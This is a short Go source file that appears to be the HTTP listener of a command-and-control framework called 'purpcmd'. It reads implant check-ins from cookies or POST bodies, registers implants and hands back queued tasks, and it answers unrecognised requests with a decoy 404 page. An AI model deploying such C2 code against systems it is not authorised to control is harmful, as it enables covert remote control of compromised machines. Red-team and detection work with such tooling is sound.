package listener

import (
	"io"
	"net/http"
	"purpcmd/internal"
	imp "purpcmd/server/implant"
	"purpcmd/server/log"
)

func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
	a,task := processPayload(r)
	
	if uint16(a) == internal.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	} else if uint16(a) == internal.REG {
		l.Association = l.Association + 1
	}

	w.WriteHeader(200)

	if len(task) >= 8 {
		w.Write(task)
		return
	}
	w.Write([]byte("Hi!"))
}


func processPayload(r *http.Request) (uint16, []byte) {
	var data []byte
	var err error

	name := r.URL.Query().Get("a")
	
	if r.Method == "GET" {
		cookies := r.Cookies()
		if len(cookies) == 0 {
			return internal.NIL, []byte{}
		} else {
			data = []byte(cookies[0].Value)
		}
	} else if r.Method == "POST" {
		data, err = io.ReadAll(r.Body)
		if err != nil {
			log.AsyncWriteStdout(err.Error())
			return internal.NIL, []byte{}
		}
	}

	return imp.ParseCallback(data, r, name)
}